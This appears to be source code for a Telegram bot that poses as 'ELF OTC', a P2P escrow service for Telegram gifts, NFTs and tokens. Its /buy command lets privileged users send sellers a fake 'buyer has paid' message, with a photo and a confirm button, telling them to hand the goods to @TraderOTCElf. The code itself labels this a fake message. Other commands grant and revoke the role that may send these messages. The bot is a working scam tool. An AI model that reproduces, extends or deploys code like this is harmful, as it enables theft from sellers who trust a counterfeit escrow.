from core.configuration.settings import app_settings

from aiogram import Router, Bot, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery

from sqlalchemy.ext.asyncio import AsyncSession

from requests.users_requests.users import UsersRequests
from requests.receipts_requests.receipts import ReceiptsRequests
from keyboards.receipt_keyboard.receipt_keyboard import receipt_button
from keyboards.main_keyboard.main_keyboard import welcome_button

router = Router()


bot = Bot(token=app_settings.TOKEN)


@router.message(Command('set_admin'))
async def cmd_create_new_admin(
    message: Message,
    session: AsyncSession
) -> str | None:

    user = UsersRequests(
        telegram_id=message.from_user.id,
        username=message.from_user.username,
        session=session
    )

    this_user = await user.set_user()

    if this_user.status == 'BigBoss':
        
        list_id = message.text.split()

        try:
            i = int(list_id[1])

            user_id = int(list_id[1])
            if this_user.telegram_id == user_id:
                return await message.answer('Вы не можете назначить себя администратором!')

            now_user = await user.get_user_by_tgId(telegram_id=user_id)

            if now_user:

                if now_user.status == 'elevated':
                    return await message.answer('⚠️ Этот пользователь уже администратор!')

                updt_user = await user.set_user_status(user_id=now_user.id)

                await bot.send_message(
                    chat_id=user_id,
                    text='🎉 Вы были назначены администратором! Вам доступна команда /buy <Комментарий к платежу(мемо)>'
                )

                return await message.answer(f'✅ Пользователь {user_id} повышен до администратора')
            
            return await message.answer('❌ Пользователь не найден!')

        except Exception as e:
            return await message.answer('Вы ввели не число!')
    
    return




@router.message(Command('kick_admin'))
async def cmd_kick_admin(
    message: Message,
    session: AsyncSession
) -> str | None:
    
    user = UsersRequests(
        telegram_id=message.from_user.id,
        username=message.from_user.username,
        session=session
    )

    this_user = await user.set_user()

    if this_user.status == 'BigBoss':

        list_id = message.text.split()

        try:

            i = int(list_id[1])

            user_id = int(list_id[1])
            if this_user.telegram_id == user_id:
                return await message.answer('Вы не можете назначить себя администратором!')  
            
            now_user = await user.get_user_by_tgId(telegram_id=user_id)

            if now_user:

                if now_user.status == 'elevated':

                    updt_user = await user.del_user_status(user_id=now_user.id)

                    return await message.answer(f'✅ Вы убрали пользователя {user_id} с позиции администратора!')

            return await message.answer('❌ Пользователь не найден!')
        
        except Exception as e:
            return await message.answer('Вы ввели не число!')
    
    return



@router.message(Command('buy'))
async def cmd_buy(
    message: Message,
    session: AsyncSession
) -> str | None:
    
    user = UsersRequests(
        telegram_id=message.from_user.id,
        username=message.from_user.username,
        session=session
    )

    this_user = await user.set_user()

    if this_user.status == 'elevated' or this_user.status == 'BigBoss':

        list_id = message.text.split()


        try:
            user_id = list_id[1]


            receipt = ReceiptsRequests(
                id_receipt=user_id,
                session=session
            )

            this_receipt = await receipt.get_receipt()

            if this_receipt:
                

                await bot.send_photo(
                    chat_id=this_receipt.user.telegram_id,
                    photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
                    caption=f"""
✅  Покупатель @{message.from_user.username} оплатил сделку, передавайте товар боту @TraderOTCElf ( Примечание: не передавайте товар напрямую пользователю ).""",
                    reply_markup=receipt_button.yes_receipt
)
                
                del_rec = await receipt.delete_receipt(user_id)

                await message.answer(f'✅ Фейк сообщение отправлено {this_receipt.user.telegram_id}')

                return await message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
caption="""
<b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>

💼 <b>Покупайте и продавайте всё, что угодно – безопасно!</b>
От Telegram-подарков и NFT до токенов – сделки проходят легко и без риска.

🔹 Удобное управление кошельками

📖 <b>Как пользоваться?</b>
Ознакомьтесь с инструкцией — https://telegra.ph/OTC-06-29

Выберите нужный раздел ниже:""",
reply_markup=welcome_button.inlkey,
parse_mode='HTML'
)
            
            return await message.answer('❌ Данный чек не активен!')

        except Exception as e:
            return await message.answer('❌ Вы ввели не число!')
        

    return



@router.callback_query(F.data=='confirm')
async def cmd_confirm(
    callback: CallbackQuery
) -> str:
    
    await callback.answer('confirm')

    return await callback.message.answer("""
<b>✅ Вы подтвердили выполнение заказа!</b>

Ждем подтверждение о получении товара от покупателя.
""", parse_mode='HTML')
